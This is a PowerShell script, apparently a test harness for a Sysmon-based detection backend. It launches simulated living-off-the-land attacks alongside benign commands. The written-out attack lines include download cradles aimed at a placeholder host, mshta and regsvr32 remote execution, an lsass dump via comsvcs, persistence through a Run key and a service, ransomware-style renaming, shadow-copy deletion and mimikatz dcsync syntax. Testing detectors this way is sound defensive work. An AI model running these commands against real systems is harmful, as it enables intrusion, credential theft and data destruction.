param(
    [int]$WindowGapSeconds = 30,
    [switch]$DryRun,
    [switch]$Cleanup
)

$ErrorActionPreference = "Continue"

$script:Base = Join-Path $env:TEMP "lotl_test"
$script:VictimDir = Join-Path $script:Base "victim"
$script:CreatedTasks = New-Object System.Collections.Generic.List[string]
$script:RegRunValue = "LOTLTestEntry"
$script:Stats = @{ Run = 0; Failed = 0 }

function Initialize-Workspace {
    New-Item -ItemType Directory -Force -Path $script:Base | Out-Null
    New-Item -ItemType Directory -Force -Path $script:VictimDir | Out-Null
}

function Invoke-CleanupArtifacts {
    Write-Host "Cleaning up artifacts..." -ForegroundColor Yellow

    if (Test-Path $script:Base) {
        Remove-Item -Recurse -Force $script:Base -ErrorAction SilentlyContinue
        Write-Host "  removed $script:Base" -ForegroundColor Gray
    }

    Get-ScheduledTask -TaskName "LOTLTest_*" -ErrorAction SilentlyContinue | ForEach-Object {
        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "  removed task $($_.TaskName)" -ForegroundColor Gray
    }

    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $script:RegRunValue /f 2>$null | Out-Null
    Write-Host "  removed HKCU\...\Run\$($script:RegRunValue)" -ForegroundColor Gray

    sc.exe delete LOTLTestSvc 2>$null | Out-Null
    Write-Host "  removed service LOTLTestSvc (if present)" -ForegroundColor Gray
}

if ($Cleanup) {
    Invoke-CleanupArtifacts
    exit 0
}

Initialize-Workspace

function Invoke-Attack {
    param(
        [string]$Label,
        [scriptblock]$Action,
        [switch]$GroupedWithNext
    )
    $script:Stats.Run++
    Write-Host ("  {0}" -f $Label) -ForegroundColor Yellow
    if ($DryRun) { return }
    try {
        & $Action 2>&1 | Out-Null
    }
    catch {
        $script:Stats.Failed++
    }
    if ($GroupedWithNext) {
        Start-Sleep -Milliseconds 250
        return
    }
    Write-Host ("  ... waiting {0}s for backend window to close" -f $WindowGapSeconds) -ForegroundColor DarkGray
    Start-Sleep -Seconds $WindowGapSeconds
}

function New-FakeBinary {
    param([string]$Name, [string]$From = "$env:SystemRoot\System32\cmd.exe")
    $target = Join-Path $script:Base $Name
    Copy-Item -Path $From -Destination $target -Force
    return $target
}

function New-DummyVictimFiles {
    1..5 | ForEach-Object {
        $f = Join-Path $script:VictimDir ("doc{0:D2}.docx" -f $_)
        Set-Content -Path $f -Value "dummy content $_" -NoNewline
    }
}

$encodedHi = "ZQBjAGgAbwAgAGgAaQA="

Write-Host ""
Write-Host "Mode: $(if ($DryRun){'DRY-RUN'} else {"per-scenario ${WindowGapSeconds}s window gap"})" -ForegroundColor Yellow
Write-Host "Sysmon must be installed and the sysmon_agent service running for this to reach the backend." -ForegroundColor DarkGray
Write-Host "Set the backend LOTL_WINDOW_SECONDS shorter than ${WindowGapSeconds}s (e.g. 10) so each scenario closes in its own window." -ForegroundColor DarkGray
Write-Host ""

Write-Host "==> YARA tier (10)" -ForegroundColor Cyan

Invoke-Attack "1/10 Office (fake winword.exe) spawns powershell -enc" {
    $fakeWord = New-FakeBinary "winword.exe"
    Start-Process $fakeWord -ArgumentList "/c", "powershell.exe -nop -w hidden -enc $encodedHi" -WindowStyle Hidden
}

Invoke-Attack "2/10 PowerShell IEX DownloadString cradle" {
    Start-Process "powershell.exe" -ArgumentList "-nop", "-w", "hidden", "-c", "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.1/x.ps1')" -WindowStyle Hidden
}

Invoke-Attack "3/10 mshta remote HTA" {
    Start-Process "mshta.exe" -ArgumentList "http://192.0.2.1/payload.hta" -WindowStyle Hidden
}

Invoke-Attack "4/10 Regsvr32 Squiblydoo /i: http://...scrobj.dll" {
    Start-Process "regsvr32.exe" -ArgumentList "/s", "/n", "/u", "/i:http://192.0.2.1/file.sct", "scrobj.dll" -WindowStyle Hidden
}

Invoke-Attack "5/10 Certutil -urlcache -split -f http://..." {
    Start-Process "certutil.exe" -ArgumentList "-urlcache", "-split", "-f", "http://192.0.2.1/p.exe", (Join-Path $script:Base "cu.bin") -WindowStyle Hidden
}

Invoke-Attack "6/10 Certutil -decode base64" {
    $b64 = Join-Path $script:Base "b64.txt"
    "dGVzdA==" | Set-Content -Path $b64 -NoNewline
    Start-Process "certutil.exe" -ArgumentList "-decode", $b64, (Join-Path $script:Base "decoded.bin") -WindowStyle Hidden
}

Invoke-Attack "7/10 Bitsadmin /transfer HTTP" {
    Start-Process "bitsadmin.exe" -ArgumentList "/transfer", "lotlJob", "/priority", "normal", "http://192.0.2.1/p.exe", (Join-Path $script:Base "bits.bin") -WindowStyle Hidden
}

Invoke-Attack "8/10 WMIC /node: remote process call create" {
    Start-Process "wmic.exe" -ArgumentList "/node:192.0.2.1", "/user:fake", "/password:fake", "process", "call", "create", "cmd.exe /c whoami" -WindowStyle Hidden
}

Invoke-Attack "9/10 Rundll32 comsvcs.dll,MiniDump (invalid PID)" {
    Start-Process "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll,MiniDump", "0", (Join-Path $script:Base "lsass.dmp"), "full" -WindowStyle Hidden
}

Invoke-Attack "10/10 Schtasks /create + powershell + 'system'" {
    $tn = "LOTLTest_system_$([Guid]::NewGuid().ToString('N').Substring(0,8))"
    Start-Process "schtasks.exe" -ArgumentList "/create", "/tn", $tn, "/tr", "powershell -nop -w hidden -c exit", "/sc", "once", "/st", "23:59", "/ru", $env:USERNAME, "/f" -WindowStyle Hidden -Wait
    $script:CreatedTasks.Add($tn)
}

Write-Host ""
Write-Host "==> ML tier (10)" -ForegroundColor Cyan

Invoke-Attack "1/10 PowerShell -nop -ep bypass -w hidden -File <missing>" {
    Start-Process "powershell.exe" -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", (Join-Path $script:Base "stage2.ps1") -WindowStyle Hidden
}

Invoke-Attack "2/10 Fake PsExec64.exe lateral movement syntax" {
    $fakePs = New-FakeBinary "PsExec64.exe"
    Start-Process $fakePs -ArgumentList "/c", "echo \\dc01.corp.local -accepteula -s -d cmd.exe /c net user backup BackupPass1! /add" -WindowStyle Hidden
}

Invoke-Attack "3/10 Concat-obfuscated PowerShell IEX bypass" {
    Start-Process "powershell.exe" -ArgumentList "-c", "& ('I'+'E'+'X') ((New-Object Net.We`bClient).Down`loadStr`ing('htt'+'p://192'+'.0'+'.2.1'+'/x'))" -WindowStyle Hidden
}

Invoke-Attack "4/10 Reg add HKCU\...\Run persistence (cleanup later)" {
    Start-Process "reg.exe" -ArgumentList "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", $script:RegRunValue, "/t", "REG_SZ", "/d", "C:\Users\Public\nonexistent_lotl.exe", "/f" -WindowStyle Hidden -Wait
}

Invoke-Attack "5/10 WMIC local process call create (cmd /c exit)" {
    Start-Process "wmic.exe" -ArgumentList "process", "call", "create", "cmd.exe /c exit" -WindowStyle Hidden
}

Invoke-Attack "6/10 net user creation attempt (admin-only, fails)" {
    Start-Process "net.exe" -ArgumentList "user", "lotl_test_user", "Pass1!Pass1!", "/add" -WindowStyle Hidden
}

Invoke-Attack "7/10 sc.exe create service to user-writable path (admin-only)" {
    Start-Process "sc.exe" -ArgumentList "create", "LOTLTestSvc", "binpath=", "C:\Users\Public\nonexistent_lotl.exe -k", "start=", "auto", "displayname=", "LOTL Test Service" -WindowStyle Hidden
}

Invoke-Attack "8/10 Mass file rename of dummy docs (ransomware-like)" {
    New-DummyVictimFiles
    Start-Process "cmd.exe" -ArgumentList "/c", "for /r `"$script:VictimDir`" %i in (*.docx) do ren `"%i`" `"%i.locked`"" -WindowStyle Hidden
}

Invoke-Attack "9/10 tasklist /v /fi imagename eq lsass.exe (credential dump prep)" {
    Start-Process "tasklist.exe" -ArgumentList "/v", "/fi", "imagename eq lsass.exe" -WindowStyle Hidden
}

Invoke-Attack "10/10 powershell Get-MpPreference (Defender recon)" {
    Start-Process "powershell.exe" -ArgumentList "-Command", "Get-MpPreference | Select-Object DisableRealtimeMonitoring, ExclusionPath" -WindowStyle Hidden
}

Write-Host ""
Write-Host "==> LLM tier (10)" -ForegroundColor Cyan

Invoke-Attack "1/10 AD recon chain: whoami /priv" -GroupedWithNext {
    Start-Process "whoami.exe" -ArgumentList "/priv" -WindowStyle Hidden
}

Invoke-Attack "1/10 AD recon chain: net group Domain Admins" -GroupedWithNext {
    Start-Process "net.exe" -ArgumentList "group", "Domain Admins", "/domain" -WindowStyle Hidden
}

Invoke-Attack "1/10 AD recon chain: nltest /domain_trusts" -GroupedWithNext {
    Start-Process "nltest.exe" -ArgumentList "/domain_trusts", "/all_trusts" -WindowStyle Hidden
}

Invoke-Attack "1/10 AD recon chain: systeminfo" {
    Start-Process "systeminfo.exe" -WindowStyle Hidden
}

Invoke-Attack "2/10 tasklist /v for lsass.exe" {
    Start-Process "tasklist.exe" -ArgumentList "/v", "/svc", "/fi", "imagename eq lsass.exe" -WindowStyle Hidden
}

Invoke-Attack "3/10 Fake Office (winword) -> mshta chain" {
    $fakeWord = New-FakeBinary "winword.exe"
    Start-Process $fakeWord -ArgumentList "/c", "mshta.exe http://192.0.2.1/dropper.hta" -WindowStyle Hidden
}

Invoke-Attack "4/10 vssadmin delete shadows /for=Z: (Z: missing, fails)" {
    Start-Process "vssadmin.exe" -ArgumentList "delete", "shadows", "/for=Z:\", "/quiet" -WindowStyle Hidden
}

Invoke-Attack "5/10 bcdedit /enum (read-only; cmdline still flagged)" {
    Start-Process "bcdedit.exe" -ArgumentList "/enum" -WindowStyle Hidden
}

Invoke-Attack "6/10 wevtutil qe Security (read-only)" {
    Start-Process "wevtutil.exe" -ArgumentList "qe", "Security", "/c:1", "/f:text" -WindowStyle Hidden
}

Invoke-Attack "7/10 cmdkey /list (credential enum)" {
    Start-Process "cmdkey.exe" -ArgumentList "/list" -WindowStyle Hidden
}

Invoke-Attack "8/10 wmic root\subscription EventFilter enum" {
    Start-Process "wmic.exe" -ArgumentList "/namespace:\\root\subscription", "path", "__EventFilter", "get", "Name" -WindowStyle Hidden
}

Invoke-Attack "9/10 Fake mimikatz.exe lsadump::dcsync syntax" {
    $fakeMimi = New-FakeBinary "mimikatz.exe"
    Start-Process $fakeMimi -ArgumentList "/c", "echo lsadump::dcsync /domain:corp.local /user:krbtgt /csv" -WindowStyle Hidden
}

Invoke-Attack "10/10 certreq + ESC1-style SAN attribute (CA missing)" {
    $inf = Join-Path $script:Base "req.inf"
    "[NewRequest]`r`nSubject=`"CN=lotltest`"`r`nKeyLength=2048" | Set-Content -Path $inf
    Start-Process "certreq.exe" -ArgumentList "-submit", "-attrib", "SAN:upn=administrator@corp.local", "-config", "MISSING-CA01.corp.local\corp-CA01-CA", $inf, (Join-Path $script:Base "cert.cer") -WindowStyle Hidden
}

Write-Host ""
Write-Host "==> Benign / FP-bait (30)" -ForegroundColor Cyan

Invoke-Attack "01/30 whoami (basic)" {
    Start-Process "whoami.exe" -WindowStyle Hidden
}

Invoke-Attack "02/30 ipconfig" {
    Start-Process "ipconfig.exe" -ArgumentList "/all" -WindowStyle Hidden
}

Invoke-Attack "03/30 ping localhost" {
    Start-Process "ping.exe" -ArgumentList "-n", "1", "127.0.0.1" -WindowStyle Hidden
}

Invoke-Attack "04/30 tracert localhost" {
    Start-Process "tracert.exe" -ArgumentList "-h", "1", "127.0.0.1" -WindowStyle Hidden
}

Invoke-Attack "05/30 nslookup local" {
    Start-Process "nslookup.exe" -ArgumentList "localhost" -WindowStyle Hidden
}

Invoke-Attack "06/30 dir of user profile" {
    Start-Process "cmd.exe" -ArgumentList "/c", "dir $env:USERPROFILE" -WindowStyle Hidden
}

Invoke-Attack "07/30 notepad opens config" {
    $f = Join-Path $script:Base "notes.txt"
    "user notes`r`nproject deliverables" | Set-Content -Path $f
    Start-Process "notepad.exe" -ArgumentList $f
    Start-Sleep -Milliseconds 600
    Get-Process -Name notepad -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -like "*notes.txt*" } | Stop-Process -Force -ErrorAction SilentlyContinue
}

Invoke-Attack "08/30 calc launch" {
    Start-Process "calc.exe"
    Start-Sleep -Milliseconds 500
    Get-Process -Name CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

Invoke-Attack "09/30 Get-Process | Where" {
    Start-Process "powershell.exe" -ArgumentList "-Command", "Get-Process | Where-Object { `$_.CPU -gt 0 } | Select-Object -First 5" -WindowStyle Hidden
}

Invoke-Attack "10/30 Get-Service WinDefend" {
    Start-Process "powershell.exe" -ArgumentList "-Command", "Get-Service WinDefend | Select Status" -WindowStyle Hidden
}

Invoke-Attack "11/30 net localgroup Administrators" {
    Start-Process "net.exe" -ArgumentList "localgroup", "Administrators" -WindowStyle Hidden
}

Invoke-Attack "12/30 wmic os get version" {
    Start-Process "wmic.exe" -ArgumentList "os", "get", "Version,BuildNumber" -WindowStyle Hidden
}

Invoke-Attack "13/30 wmic product list" {
    Start-Process "wmic.exe" -ArgumentList "product", "get", "name,version" -WindowStyle Hidden
}

Invoke-Attack "14/30 sfc /verifyonly (read-only)" {
    Start-Process "sfc.exe" -ArgumentList "/verifyonly" -WindowStyle Hidden
}

Invoke-Attack "15/30 Robocopy own files (mirror to backup dir)" {
    $dst = Join-Path $script:Base "backup"
    Start-Process "robocopy.exe" -ArgumentList $script:VictimDir, $dst, "/MIR", "/R:1", "/W:1" -WindowStyle Hidden
}

Invoke-Attack "16/30 schtasks /query" {
    Start-Process "schtasks.exe" -ArgumentList "/query", "/fo", "LIST" -WindowStyle Hidden
}

Invoke-Attack "17/30 gpresult /r" {
    Start-Process "gpresult.exe" -ArgumentList "/r" -WindowStyle Hidden
}

Invoke-Attack "18/30 reg query HKLM\SOFTWARE" {
    Start-Process "reg.exe" -ArgumentList "query", "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" -WindowStyle Hidden
}

Invoke-Attack "19/30 tasklist (no filter)" {
    Start-Process "tasklist.exe" -WindowStyle Hidden
}

Invoke-Attack "20/30 type a file (open notepad-like)" {
    $f = Join-Path $script:Base "readme.txt"
    "readme contents" | Set-Content -Path $f
    Start-Process "cmd.exe" -ArgumentList "/c", "type `"$f`"" -WindowStyle Hidden
}

Invoke-Attack "21/30 PowerShell with -File (legit script)" {
    $script1 = Join-Path $script:Base "legit.ps1"
    "Get-Date | Out-Null" | Set-Content -Path $script1
    Start-Process "powershell.exe" -ArgumentList "-File", $script1 -WindowStyle Hidden
}

Invoke-Attack "22/30 Get-ChildItem on user docs" {
    Start-Process "powershell.exe" -ArgumentList "-Command", "Get-ChildItem `$env:USERPROFILE\Documents -ErrorAction SilentlyContinue | Select-Object -First 5 Name" -WindowStyle Hidden
}

Invoke-Attack "23/30 hostname" {
    Start-Process "hostname.exe" -WindowStyle Hidden
}

Invoke-Attack "24/30 ver via cmd" {
    Start-Process "cmd.exe" -ArgumentList "/c", "ver" -WindowStyle Hidden
}

Invoke-Attack "25/30 set environment listing" {
    Start-Process "cmd.exe" -ArgumentList "/c", "set" -WindowStyle Hidden
}

Invoke-Attack "26/30 netstat -an" {
    Start-Process "netstat.exe" -ArgumentList "-an" -WindowStyle Hidden
}

Invoke-Attack "27/30 net session (check connections)" {
    Start-Process "net.exe" -ArgumentList "session" -WindowStyle Hidden
}

Invoke-Attack "28/30 fsutil drives list" {
    Start-Process "fsutil.exe" -ArgumentList "fsinfo", "drives" -WindowStyle Hidden
}

Invoke-Attack "29/30 timeout 1 (simulate sleep in script)" {
    Start-Process "timeout.exe" -ArgumentList "/t", "1", "/nobreak" -WindowStyle Hidden
}

Invoke-Attack "30/30 Get-EventLog -LogName System -Newest 1 (read-only)" {
    Start-Process "powershell.exe" -ArgumentList "-Command", "Get-EventLog -LogName System -Newest 1 -ErrorAction SilentlyContinue | Select-Object -Property TimeGenerated,EntryType" -WindowStyle Hidden
}

Write-Host ""
Write-Host "==> Done" -ForegroundColor Yellow
Write-Host ("    Triggered: {0}" -f $script:Stats.Run)
Write-Host ("    Failed:    {0}" -f $script:Stats.Failed)
Write-Host ""
Write-Host "Each scenario ran in its own window (${WindowGapSeconds}s gap); set LOTL_WINDOW_SECONDS below that." -ForegroundColor Gray
Write-Host "Wait one more window, then check Elasticsearch:" -ForegroundColor Gray
Write-Host "  curl 'http://192.168.10.10:9200/lotl-alerts-backend*/_search?pretty&size=50&sort=@timestamp:desc'" -ForegroundColor Gray
Write-Host ""
Write-Host "Cleanup artifacts (temp files, scheduled tasks, HKCU\Run entry, LOTLTestSvc):" -ForegroundColor Gray
Write-Host "  .\run_lotl_attacks.ps1 -Cleanup" -ForegroundColor Gray
Write-Host ""
